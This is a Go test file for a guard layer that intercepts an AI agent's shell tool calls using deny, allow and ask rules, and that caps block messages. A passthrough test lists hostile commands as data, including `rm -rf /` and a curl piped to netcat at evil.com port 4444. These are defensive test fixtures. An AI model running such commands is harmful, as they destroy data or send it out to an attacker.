package guard

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/Autumn-27/artex/internal/db"
	"github.com/Autumn-27/artex/internal/intercept"
	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// Worker and coordinator guards must apply the same rules before the target gate.
func TestCoordinatorEnforcesRules(t *testing.T) {
	for _, kind := range []struct {
		name     string
		newGuard func(*intercept.Interceptor) *Guard
	}{{"worker", NewWithInterceptor}, {"coordinator", NewCoordinator}} {
		t.Run(kind.name, func(t *testing.T) {
			ic := intercept.New(nil)
			ic.SetRulesForTest([]db.InterceptRule{
				{ID: 1, Name: "built-in deny", Enabled: true, MatchTarget: "tool_input", MatchType: "string", Action: "deny", Pattern: "built-in-marker", Message: "built-in denied"},
				{ID: 2, Name: "user deny", Enabled: true, MatchTarget: "tool_input", MatchType: "string", Action: "deny", Pattern: "deny-marker", Message: "user denied"},
				{ID: 3, Name: "user allow", Enabled: true, MatchTarget: "tool_input", MatchType: "string", Action: "allow", Pattern: "allow-marker"},
				{ID: 4, Name: "user ask", Enabled: true, MatchTarget: "tool_input", MatchType: "string", Action: "ask", Pattern: "ask-marker"},
			})
			g := kind.newGuard(ic)
			gate := &fakeGate{t: t}
			g.gate = gate
			for _, enabled := range []bool{false, true} {
				ctx := context.Background()
				if enabled {
					ctx = gateOn(ctx, "7", time.Minute)
				}
				for _, word := range []string{"built-in-marker", "deny-marker"} {
					if block, _ := pre(g, ctx, "Bash", `{"command":"echo `+word+`"}`); !block {
						t.Fatalf("gate enabled=%v: %s was not denied", enabled, word)
					}
				}
				if block, msg := pre(g, ctx, "Bash", `{"command":"echo allow-marker"}`); block {
					t.Fatalf("gate enabled=%v: allow was blocked: %s", enabled, msg)
				}
			}
			if gate.checks != 1 {
				t.Fatalf("gate checks = %d, want one allowed call", gate.checks)
			}
			ctx, cancel := context.WithCancel(context.Background())
			cancel()
			if block, msg := pre(g, ctx, "Bash", `{"command":"echo ask-marker"}`); !block || !strings.Contains(msg, "work cancelled") {
				t.Fatalf("cancelled ask: block=%v message=%q", block, msg)
			}
			ctx = intercept.WithNoRuleApprovalWait(context.Background())
			if block, msg := pre(g, ctx, "Bash", `{"command":"echo ask-marker"}`); !block || !strings.Contains(msg, "cannot wait") {
				t.Fatalf("nonwaiting ask: block=%v message=%q", block, msg)
			}
		})
	}
}

// A deny rule with an oversized message reaches the model capped, with the
// platform framing and the guidance intact.
func TestDenyRuleReasonIsCapped(t *testing.T) {
	ic := intercept.New(nil)
	ic.SetRulesForTest([]db.InterceptRule{
		{ID: 1, Name: "Huge message", Enabled: true, Priority: 50,
			MatchTarget: "tool_input", MatchType: "string", Action: "deny",
			Pattern: "whoami", Message: strings.Repeat("日", 20000)},
	})
	block, msg := pre(NewWithInterceptor(ic), context.Background(), "Bash", `{"command":"whoami"}`)
	if !block {
		t.Fatal("the deny rule did not block")
	}
	limit := maxBlockReasonRunes + utf8.RuneCountInString(systemBlockMessage("")+" …(truncated)")
	if n := utf8.RuneCountInString(msg); n > limit {
		t.Fatalf("message has %d runes, want at most %d", n, limit)
	}
	if !utf8.ValidString(msg) ||
		!strings.HasPrefix(msg, "[ARTEX platform control, not target defense] This call was intercepted by the platform. Reason: ") ||
		!strings.HasSuffix(msg, strings.Repeat("日", maxBlockReasonRunes)+" …(truncated). This operation is forbidden.") {
		t.Errorf("capped message lost its framing or guidance: %q...%q", msg[:120], msg[len(msg)-120:])
	}
}

// A target block with an oversized reason is capped the same way, and keeps the
// target and the guidance of its code.
func TestTargetBlockReasonIsCapped(t *testing.T) {
	res := intercept.TargetResult{Code: intercept.TargetDenied, Host: "app.example.com", Port: 443,
		Reason: strings.Repeat("é", 20000)}
	msg := TargetBlockMessage(res)
	empty := res
	empty.Reason = ""
	limit := maxBlockReasonRunes + utf8.RuneCountInString(TargetBlockMessage(empty)+" …(truncated)")
	if n := utf8.RuneCountInString(msg); n > limit {
		t.Fatalf("message has %d runes, want at most %d", n, limit)
	}
	if !utf8.ValidString(msg) ||
		!strings.HasPrefix(msg, "[ARTEX platform control, not target defense] TARGET_DENIED: target app.example.com:443: ") ||
		!strings.HasSuffix(msg, strings.Repeat("é", maxBlockReasonRunes)+" …(truncated). "+targetGuidance[intercept.TargetDenied]) {
		t.Errorf("capped message lost its target or guidance: %q...%q", msg[:120], msg[len(msg)-120:])
	}
}

// A reason within the cap passes through byte for byte.
func TestShortBlockReasonUnchanged(t *testing.T) {
	for _, s := range []string{"", "Destructive command rejected", strings.Repeat("日", maxBlockReasonRunes)} {
		if got := capBlockReason(s); got != s {
			t.Errorf("capBlockReason changed a reason of %d runes", utf8.RuneCountInString(s))
		}
	}
	if got, want := systemBlockMessage("Destructive command rejected"),
		"[ARTEX platform control, not target defense] This call was intercepted by the platform. Reason: Destructive command rejected. This operation is forbidden."; got != want {
		t.Errorf("systemBlockMessage = %q, want %q", got, want)
	}
	res := intercept.TargetResult{Code: intercept.TargetDenied, Host: "app.example.com", Port: 443, Reason: "the request was denied"}
	if got, want := TargetBlockMessage(res),
		"[ARTEX platform control, not target defense] TARGET_DENIED: target app.example.com:443: the request was denied. "+targetGuidance[intercept.TargetDenied]; got != want {
		t.Errorf("TargetBlockMessage = %q, want %q", got, want)
	}
}

var _ = hook.PreToolUse
